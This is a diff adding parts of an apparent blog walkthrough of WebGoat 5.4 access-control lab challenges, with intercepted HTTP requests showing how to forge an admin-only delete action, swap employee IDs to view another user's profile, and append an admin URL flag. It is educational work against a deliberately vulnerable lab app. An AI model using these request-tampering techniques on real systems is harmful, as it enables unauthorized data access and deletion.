@@ -22,3 +22,99 @@ First I took a look at the directory structure in the VM. I'm not sure if that i
 And bingo! We have access.
 
 The lesson here is that controlling access by simply limiting functional view client-side does not prevent request-tampering by savvy users or attackers.
+
+# Access Control Flaws Part 2: Bypassing Presentation Level Access Control
+For this challenge we are givin a login screen for an employee portal at Goat Hills Financial. Our goal is, as regular user 'Tom', to exploit weak access control to use the admin-only```Delete``` function to delete a user profile. We are givin all the login information for the users (password=firstname in lowercase), so lets take a look at what a legitimate admin usage of ```Delete``` looks like:
+
+First, we login as admin user "John":
+
+```
+POST /WebGoat/attack?Screen=65&menu=200 HTTP/1.1
+Host: 192.168.56.101
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://192.168.56.101/WebGoat/attack?Screen=65&menu=200&stage=1
+Cookie: JSESSIONID=D693B413D068E6FBF713D72CD2522A3B; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
+Authorization: Basic dXNlcjp1c2Vy
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 42
+
+employee_id=111&password=john&action=Login
+```
+
+We are presented with the admin control page.
+
+<img src="{{ site.baseurl }}/images/admin-page.jpg">
+
+Next, we delete Tom's profile:
+
+```
+POST /WebGoat/attack?Screen=65&menu=200 HTTP/1.1
+Host: 192.168.56.101
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://192.168.56.101/WebGoat/attack?Screen=65&menu=200
+Cookie: JSESSIONID=D693B413D068E6FBF713D72CD2522A3B; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
+Authorization: Basic dXNlcjp1c2Vy
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+
+employee_id=105&action=DeleteProfile
+```
+Hmm. It looks like there is no verification that the user requesting the deletion is an admin in the request. While the button linked to the ```Delete``` function is only accessible from the admin control panel, we can craft our own request while we are not logged in as an admin and it should function identically as if we were.
+
+So we log back into Tom's account and press the ```ViewProfile``` button. Intercepting the request, we change the action to DeleteProfile:
+
+<img src="{{ site.baseurl }}/images/tom-delete.jpg">
+
+Got 'em.
+
+# Access Control Flaws Part 3: Bypassing Data Level Access Control
+So for this part of the challenge, our goal is to view another user's profile. To start, lets log back into Tom's account and press ```ViewProfile```. Intercepting that request, we can see that Tom's ```employee_id``` is 105. 
+
+```
+POST /WebGoat/attack?Screen=65&menu=200 HTTP/1.1
+Host: 192.168.56.101
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://192.168.56.101/WebGoat/attack?Screen=65&menu=200
+Cookie: JSESSIONID=D693B413D068E6FBF713D72CD2522A3B; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
+Authorization: Basic dXNlcjp1c2Vy
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+
+employee_id=105&action=ViewProfile
+```
+Assuming these are sequentially assigned, why don't we just try to change it to another close number that should be in our user set? So we alter the ```employee_id``` field to 103 to try to take a look at Curly's profile, and:
+
+<img src="{{ site.baseurl }}/images/tom-view.jpg">
+
+Boom. Curly's paid/owed ratio isn't too hot.
+
+# Access Control Flaws Final: Remote Admin Access
+The goal for this final section is to access the admin interface for WebGoat. One of the given hints is that the admin interface is hackable via URL. After messing around for a while (too long to admit), the idea of URL-field specifications came to mind. I tried something super simple, and appended ```&admin=true``` onto the end of the URL...
+
+<img src="{{ site.baseurl }}/images/admin-functions.jpg">
+
+Well, alright then. So we get access to this whole set of admin functions. Trying ```User Information```, we intercept the request and add ```&admin=true``` onto it (to ensure we keep our admin status). This yields us a list of users:
+
+<img src="{{ site.baseurl }}/images/admin-function-users.jpg">
+
+While ```Product Information``` (again appending the admin tag) yields us this list:
+
+<img src="{{ site.baseurl }}/images/admin-function-products.jpg">
+
+Clicking ```Adhoc Query``` leads us to a page where we are supposed to enter a SQL statement to post to the message board
+
+<img src="{{ site.baseurl }}/images/admin-function-sql.jpg">
+
+However, unfortunately the functionality is broken in my version of WebGoat. Maybe I will try to get a newer version running and come back at some point to replace any broken parts of 5.4 with the (hopefully) patched challenges.
